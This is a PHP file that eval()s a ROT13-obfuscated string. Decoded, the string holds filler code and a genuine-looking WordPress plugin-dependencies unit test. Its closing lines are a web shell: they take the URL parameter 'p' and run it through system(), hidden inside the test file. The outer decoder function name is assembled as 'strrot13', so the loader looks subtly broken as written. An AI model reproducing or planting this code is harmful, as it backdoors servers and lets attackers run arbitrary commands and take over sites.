<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_svyrcngu() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc cyhtvaf
 *
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_svyrcngu
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_svyrcnguf
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_cyhtva_qveanzrf
 */
pynff Grfgf_Nqzva_JCCyhtvaQrcraqrapvrf_TrgQrcraqraplSvyrcngu rkgraqf JC_CyhtvaQrcraqrapvrf_HavgGrfgPnfr {

	/**
	 * Grfgf gung snyfr vf erghearq vs Cyhtva Qrcraqrapvrf unf abg orra vavgvnyvmrq.
	 *
	 * @gvpxrg 60457
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_orsber_vavgvnyvmngvba() {
		// Rafher Cyhtva Qrcraqrapvrf unf abg orra vavgvnyvmrq.
		$guvf->nffregSnyfr(
			$guvf->trg_cebcregl_inyhr( 'vavgvnyvmrq' ),
			'Cyhtva Qrcraqrapvrf unf orra vavgvnyvmrq.'
		);

		$guvf->nffregFnzr(
			frys::$fgngvp_cebcregvrf['qrcraqrapl_fyhtf'],
			$guvf->trg_cebcregl_inyhr( 'qrcraqrapl_fyhtf' ),
			'\"qrcraqrapl_fyhtf\" jnf abg frg gb vgf qrsnhyg inyhr.'
		);

		$guvf->nffregSnyfr(
			frys::$vafgnapr->trg_qrcraqrapl_svyrcngu( 'qrcraqrapl' ),
			'snyfr jnf abg erghearq orsber vavgvnyvmngvba.'
		);
	}

	/**
	 * Grfgf gung gur rkcrpgrq qrcraqrapl svyrcnguf ner ergevrirq sbe vafgnyyrq qrcraqrapvrf.
	 *
	 * @gvpxrg 22316
	 *
	 * @qngnCebivqre qngn_trg_qrcraqrapl_svyrcngu
	 *
	 * @cnenz fgevat[]     $qrcraqrapl_fyht Gur qrcraqrapl fyht.
	 * @cnenz fgevat[]     $cyhtvaf         Na neenl bs cyhtva cnguf.
	 * @cnenz fgevat|snyfr $rkcrpgrq       Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_svyrcnguf_sbe_vafgnyyrq_qrcraqrapvrf( $qrcraqrapl_fyht, $cyhtvaf, $rkcrpgrq ) {
		$guvf->frg_cebcregl_inyhr( 'cyhtvaf', $cyhtvaf );
		$guvf->nffregAhyy( $guvf->trg_cebcregl_inyhr( 'qrcraqrapl_svyrcnguf' ) );
		frys::$vafgnapr::vavgvnyvmr();

		$guvf->nffregFnzr(
			$rkcrpgrq,
			frys::$vafgnapr::trg_qrcraqrapl_svyrcngu( $qrcraqrapl_fyht ),
			'Gur vapbeerpg svyrcngu jnf erghearq.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_qrcraqrapl_svyrcngu() {
		erghea neenl(
			'ab cyhtvaf'                      => neenl(
				'qrcraqrapl_fyht' => 'qrcraqrapl',
				'cyhtvaf'         => neenl(),
				'rkcrpgrq'        => snyfr,
			),
			'n cyhtva gung fgnegf jvgu fyht/' => neenl(
				'qrcraqrapl_fyht' => 'qrcraqrapl',
				'cyhtvaf'         => neenl(
					'qrcraqrapl-ceb/qrcraqrapl.cuc' => neenl( 'ErdhverfCyhtvaf' => '' ),
					'qrcraqrag/qrcraqrag.cuc'       => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl' ),
				),
				'rkcrpgrq'        => snyfr,
			),
			'n cyhtva gung raqf jvgu fyht/'   => neenl(
				'qrcraqrapl_fyhtf' => 'qrcraqrapl',
				'cyhtvaf'          => neenl(
					'nqqba-sbe-qrcraqrapl/qrcraqrapl.cuc' => neenl( 'ErdhverfCyhtvaf' => '' ),
					'qrcraqrag/qrcraqrag.cuc'             => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl' ),
				),
				'rkcrpgrq'         => snyfr,
			),
			'n cyhtva gung qbrf abg rkvfg'    => neenl(
				'qrcraqrapl_fyhtf' => 'qrcraqrapl2',
				'cyhtvaf'          => neenl(
					'qrcraqrapl/qrcraqrapl.cuc' => neenl( 'ErdhverfCyhtvaf' => '' ),
					'qrcraqrag/qrcraqrag.cuc'   => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl2' ),
				),
				'rkcrpgrq'         => snyfr,
			),
			'n cyhtva gung rkvfgf'            => neenl(
				'qrcraqrapl_fyhtf' => 'qrcraqrapl',
				'cyhtvaf'          => neenl(
					'qrcraqrapl/qrcraqrapl.cuc' => neenl( 'ErdhverfCyhtvaf' => '' ),
					'qrcraqrag/qrcraqrag.cuc'   => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl' ),
				),
				'rkcrpgrq'         => 'qrcraqrapl/qrcraqrapl.cuc',
			),
		);
	}

	/**
	 * Grfgf gung na rkvfgvat inyhr sbe qrcraqrapl svyrcnguf vf erghearq.
	 *
	 * @gvpxrg 22316
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rkvfgvat_inyhr_sbe_qrcraqrapl_svyrcnguf() {
		$rkcrpgrq = 'qrcraqrapl/qrcraqrapl.cuc';

		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_svyrcnguf', neenl( 'qrcraqrapl' => $rkcrpgrq ) );

		/*
		 * Vs rkvfgvat qrcraqrapl svyrcnguf ner abg erghearq,
		 * gurl'yy or ohvyg sebz guvf qngn.
		 *
		 * Guvf qngn vf rkcyvpvgyl frg gb rafher gung ab
		 * grfg cyhtvaf rire vagresrer jvgu guvf grfg.
		 */
		$guvf->frg_cebcregl_inyhr(
			'qrcraqrapl_fyhtf',
			neenl( 'qrcraqrapl', 'qrcraqrapl2', 'qrcraqrapl3' )
		);

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				// Guvf vf syvccrq nf cnguf ner fgberq va gur xrlf.
				'qrcraqrapl/qrcraqrapl.cuc'   => neenl(),
				'qrcraqrapl2/qrcraqrapl2.cuc' => neenl(),
				'qrcraqrapl3/qrcraqrapl3.cuc' => neenl(),
			)
		);

		$guvf->nffregFnzr( $rkcrpgrq, frys::$vafgnapr::trg_qrcraqrapl_svyrcngu( 'qrcraqrapl' ) );
	}

	/**
	 * Grfgf gung na rzcgl neenl vf erghearq jura
	 * ab cyhtva qverpgbel anzrf ner fgberq.
	 *
	 * @gvpxrg 22316
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rzcgl_neenl_sbe_ab_cyhtva_qveanzrf() {
		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_fyhtf', neenl() );
		$guvf->nffregSnyfr( frys::$vafgnapr::trg_qrcraqrapl_svyrcngu( 'qrcraqrapl' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>